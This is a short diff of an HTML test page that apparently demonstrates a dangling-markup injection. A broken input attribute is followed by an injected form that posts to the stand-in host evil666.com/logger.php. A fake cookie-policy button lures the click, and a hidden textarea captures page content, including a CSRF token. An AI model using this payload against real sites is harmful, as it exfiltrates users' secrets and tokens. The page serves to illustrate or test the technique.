@@ -5,14 +5,12 @@
 There is a page<br>
 here is the broken input:<input name="test" value="hack   ">injection goes here
 <form action="http://evil666.com/logger.php">
-   <input type="submit" value="Close" class="submitButton">
+   please click here if you accept cookie policy: <input type="submit" value="Close" class="submitButton"><br>
+   some hidden textarea:<br>
     <textarea style="visibility:hidden" name="confirmationText">
 
-
-
-
-here we have some secret info<br>
-or even more info <br>
-<input name="csrf" value="secret">
+Suppose we have some secret info here<br>
+or even more info here like CSRF token:<br>
+<input name="csrf" value="secret_very_secret">
 
 </html>
